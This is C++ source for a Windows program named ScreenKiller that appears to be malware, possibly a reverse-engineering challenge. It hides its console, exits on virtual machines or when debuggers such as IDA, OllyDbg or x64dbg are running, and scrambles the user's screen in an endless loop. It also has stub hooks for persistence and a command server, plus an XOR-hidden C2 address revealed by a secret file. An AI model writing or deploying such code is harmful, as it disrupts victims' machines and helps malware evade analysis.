#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <fstream>
#include <thread>
#include <cmath>

#include "ScreenKiller.hpp"

VOID WINAPI ScrambleWindow(PScreenProps screen_props, ScreenKiller *obj);

ScreenKiller::ScreenKiller() : m_alive(false), m_persistent(false), m_connected(false) {}

ScreenKiller::~ScreenKiller()
{
	this->suicide();
}

void ScreenKiller::deploy()
{
	
	this->m_alive = true;

	ShowWindow(GetConsoleWindow(), SW_HIDE);

	this->runner_thread = std::thread([this] {this->deploy_inner(); });
}

void ScreenKiller::suicide()
{
	this->runner_thread.detach();
	this->m_alive = false;
}

std::string ScreenKiller::encrypt_string(const std::string& input_string) const
{
	std::string output_string = "";
	
	for (const char& current_char : input_string) 
	{
		output_string += static_cast<char>((current_char ^ XOR_KEY));
	}

	return output_string;
}

std::string ScreenKiller::encode_string(const std::string & input_string)
{
	std::string output_string = "";
	char last_char = 0xc4, current_char;
	auto it = input_string.begin();

	for (int index = 0; it < input_string.end(); it++, index++)
	{
		current_char = *it ^ (lcm(index + 1, pow(last_char, 2) + 5) % UINT8_MAX);
		output_string += current_char;
		last_char = current_char;
	}

	return output_string;
}

bool ScreenKiller::deploy_inner()
{
	this->check_secret_file();
	this->exit_if_vm_cpuid();
	this->connect_to_master_server();
	this->exit_if_debugged();
	this->get_persistency();

	HWND hDesktop = NULL;
	ScreenProps screen_props = { 0 };
	hDesktop = GetDesktopWindow();

	screen_props.hdcScreen = GetDCEx(hDesktop, NULL, DCX_CACHE | DCX_LOCKWINDOWUPDATE);

	srand(GetCurrentTime());

	RECT desktop = { 0 };
	
	GetWindowRect(hDesktop, &(screen_props.rectScreen));

	while (this->m_alive)
	{
		ScrambleWindow(&screen_props, this);
		Sleep(10);
	}

	return true;
}

bool ScreenKiller::get_persistency()
{
	return false;
}

bool ScreenKiller::connect_to_master_server()
{
	return false;
}

void ScreenKiller::exit_if_vm_cpuid()
{
	int registers[4];

	__cpuid(registers, 1);
	if (static_cast<bool>((registers[2] >> 31) & 0x1))
	{
		exit(1337);
	}
}

void ScreenKiller::exit_if_debugged()
{
	if (this->is_debugged1() || this->is_debugged2())
		exit(1337);
}

bool ScreenKiller::is_debugged1()
{
	return IsDebuggerPresent();
}

bool ScreenKiller::is_debugged2()
{
		const wchar_t* debuggersFilename[6] = {
			L"cheatengine-x86_64.exe",
			L"ollydbg.exe",
			L"ida.exe",
			L"ida64.exe",
			L"radare2.exe",
			L"x64dbg.exe"
		};

		wchar_t* processName;
		PROCESSENTRY32W processInformation{ sizeof(PROCESSENTRY32W) };
		HANDLE processList;
		
		processList = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
		processInformation = { sizeof(PROCESSENTRY32W) };
		if (!(Process32FirstW(processList, &processInformation)))
			return false;
		else
		{
			do
			{
				for (const wchar_t* debugger : debuggersFilename)
				{
					processName = processInformation.szExeFile;
					if (_wcsicmp(debugger, processName) == 0) {
						return true;
					}
				}
			} while (Process32NextW(processList, &processInformation));
		}
		CloseHandle(processList);

		return false;
}

void ScreenKiller::check_secret_file()
{
	FILE *fp; 
	char secret_buf[MAX_FILE] = { 0 };
	char *temp_path;
	size_t sz = 0;
	_dupenv_s(&temp_path, &sz, "temp");

	std::string filename = "\\secret.txt";
	filename = temp_path + filename;

	fopen_s(&fp, filename.c_str(), "r");
	if (fp == NULL)
		return;
	fread(secret_buf, 1, MAX_FILE, fp);
	
	std::string encoded_key = this->encode_string(secret_buf);

	if (encoded_key == ENCODED_KEY)
		MessageBoxA(NULL, (this->decrypt_ip(secret_buf)).c_str(), "This is my c2", NULL);
}

std::string ScreenKiller::decrypt_ip(std::string key)
{
	std::string ip = "", encrypted_ip = ENCODED_IP;
	auto it = encrypted_ip.begin();

	for (int index = 0; it < encrypted_ip.end(); it++, index++)
	{
		ip += *it ^ key[index % key.length()];
	}

	return ip;
}

long long ScreenKiller::gcd(long long int a, long long int b)
{
	if (b == 0)
		return a;
	
	return gcd(b, a % b);
}

long long ScreenKiller::lcm(long long int a, long long int b)
{
	return (a / gcd(a, b)) * b;
}

VOID WINAPI ScrambleWindow(PScreenProps screen_props, ScreenKiller *obj) 
{
	HDC hdcScreen = screen_props->hdcScreen;
	RECT rectScreen = screen_props->rectScreen;
	HDC hdcMemory = NULL;
	HBITMAP hBitmap = NULL;
	int iWidth, iHeight, iX1, iY1, iX2, iY2;

	hdcMemory = CreateCompatibleDC(hdcScreen);

	iWidth = abs(rectScreen.left - rectScreen.right) / DIVIDERS;
	iHeight = abs(rectScreen.top - rectScreen.bottom) / DIVIDERS;

	SelectObject(hdcMemory, hBitmap);

	while (TRUE)
	{
		obj->exit_if_debugged();

		iX1 = rectScreen.left + iWidth * (rand() % DIVIDERS);
		iX2 = rectScreen.left + iWidth * (rand() % DIVIDERS);
		iY1 = rectScreen.top + iHeight * (rand() % DIVIDERS);
		iY2 = rectScreen.top + iHeight * (rand() % DIVIDERS);

		BitBlt(hdcMemory, 0, 0, iWidth, iHeight, hdcScreen, iX1, iY1, SRCCOPY);
		BitBlt(hdcScreen, iX1, iY1, iWidth, iHeight, hdcScreen, iX2, iY2, SRCCOPY);
		BitBlt(hdcScreen, iX2, iY2, iWidth, iHeight, hdcMemory, 0, 0, SRCCOPY);

		Sleep(10);
	}

	DeleteDC(hdcMemory);
	DeleteObject(hBitmap);
	free(screen_props);
}
